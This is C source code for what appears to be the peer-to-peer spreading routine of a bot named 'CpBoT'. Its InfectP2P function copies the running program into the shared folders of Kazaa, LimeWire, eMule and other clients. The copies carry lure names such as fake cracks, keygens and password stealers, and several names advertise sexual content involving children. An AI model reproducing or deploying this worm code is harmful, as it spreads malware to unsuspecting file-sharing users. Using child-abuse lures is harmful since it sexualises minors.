//|				_________       __________     ___________		   |//
//|				\_   ___ \______\______   \ ___\__    ___/		   |//
//|				/    \  \/\____ \|    |  _//  _ \|    |			   |//
//|				\     \___|  |_> >    |   (  <_> )    |			   |//
//|				 \______  /   __/|______  /\____/|____|			   |//
//|						\/|__|          \/						   |//

#include "Includes.h"

char *szPath[] = // Old Paths, need fixing.
{
	"C:\\program files\\kazaa\\my shared folder\\",
	"C:\\program files\\kazaa lite\\my shared folder\\",
	"C:\\program files\\kazaa lite k++\\my shared folder\\",
	"C:\\program files\\icq\\shared folder\\",
	"C:\\program files\\grokster\\my grokster\\",
	"C:\\program files\\bearshare\\shared\\",
	"C:\\program files\\edonkey2000\\incoming\\",
	"C:\\program files\\emule\\incoming\\",
	"C:\\program files\\morpheus\\my shared folder\\",
	"C:\\program files\\limewire\\shared\\",
	"C:\\program files\\tesla\\files\\",
	"C:\\program files\\winmx\\shared\\",
};

char *szFiles[] =
{
	"Limewire PRO Final Edition.exe",
	"Steam Crack.exe",
	"Counter Strike Source Crack.exe",
	"Windows XP Validator Crack.exe",
	"Spore Full Patcher.exe",
	"Spore Crack.exe",
	"Hotmail Hacker.exe",
	"Hotmail Cracker.exe",
	"Norton AntiVirus ALL VERSIONS Crack.exe",
	"Kaspersky Crack.exe",
	"DCOM Exploit.exe",
	"NetBIOS Hacker.exe",
	"NetBIOS Cracker.exe",
	"Windows Password Cracker.exe",
	"L0pht 4.0 Windows Password Cracker.exe",
	"sdbot with NetBIOS Spread.exe",
	"Sub7 2.3 Private.exe",
	"Microsoft Visual C++ KeyGen.exe",
	"Microsoft Visual Basic KeyGen.exe",
	"Microsoft Visual Studio KeyGen.exe",
	"Young girl and boy sex.scr",
	"Young boy nude.scr",
	"Young girl nude.scr",
	"teen sex.scr",
	"older man and young boy.scr",
	"young girl first time.scr",
	"MSN Password Cracker.exe",
	"SAMP GTA MultiPlayer.exe",
	"MSN Password Stealer.exe",
	"MSN Keylogger.exe",
	"Keylogger.exe",
	"Bebo/Myspace/Facebook Password Stealer.exe",
	"Dark DDoS Tool.exe",
	"Steam KeyGen.exe",
	"DivX Pro + KeyGen.exe",
	"Youtube Account Cracker.exe",
	"MSN Spammer/Nudger.exe"
};

bool InfectP2P()
{
	Peer2PeerInfo_s *pPeer2PeerInfo_s = new Peer2PeerInfo_s;

	if (pPeer2PeerInfo_s) 
		ZeroMemory(pPeer2PeerInfo_s, sizeof(Peer2PeerInfo_s));
	else
		ExitThread(0);

	GetModuleFileName(GetModuleHandle(NULL), pPeer2PeerInfo_s->szDirectory, sizeof(pPeer2PeerInfo_s->szDirectory));
	for (int i = 0; i < (sizeof(szPath) / sizeof(LPTSTR)); i++)
	{
		for (int j = 0; j < (sizeof(szFiles) / sizeof(LPTSTR)); j++)
		{
			strcpy(pPeer2PeerInfo_s->szFilePath, szPath[i]);
			strcat(pPeer2PeerInfo_s->szFilePath, szFiles[j]);
			if (CopyFile(pPeer2PeerInfo_s->szDirectory, pPeer2PeerInfo_s->szFilePath, false) != 0) 
			{ 
				SetFileAttributes(pPeer2PeerInfo_s->szFilePath, FILE_ATTRIBUTE_NORMAL);    
			} 
		}
	}
	delete pPeer2PeerInfo_s;
	return true;
}
